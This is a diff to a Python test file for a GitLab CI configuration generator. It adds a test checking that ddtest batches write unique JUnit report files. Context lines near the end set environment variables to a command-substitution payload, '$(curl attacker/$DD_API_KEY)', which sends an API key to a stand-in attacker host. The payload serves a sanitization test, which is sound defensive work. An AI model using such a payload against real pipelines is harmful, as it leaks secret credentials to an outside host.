@@ -207,6 +207,16 @@ def test_ddtest_jobs_preserve_environment_values_with_spaces(gen_gitlab_config_m
     assert (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text().count('eval "export ${!env_var}"') == 2
 
 
+def test_ddtest_batches_write_unique_junit_reports(gen_gitlab_config_mod):
+    test_template = (gen_gitlab_config_mod.GITLAB / "tests.yml").read_text()
+
+    assert (
+        'work_item_command="${!command_var} '
+        '--junitxml=test-results/junit.${environment_hash}.${ci_node_index}.xml"' in test_template
+    )
+    assert 'ddtest run --platform python --framework pytest --command "${work_item_command}"' in test_template
+
+
 def test_build_base_test_artifacts_template_gets_sanitized_bool_values(gen_gitlab_config_mod, monkeypatch, tmp_path):
     monkeypatch.setenv("NIGHTLY_BUILD", "$(curl attacker/$DD_API_KEY)")
     monkeypatch.setenv("UNPIN_DEPENDENCIES", "$(curl attacker/$DD_API_KEY)")
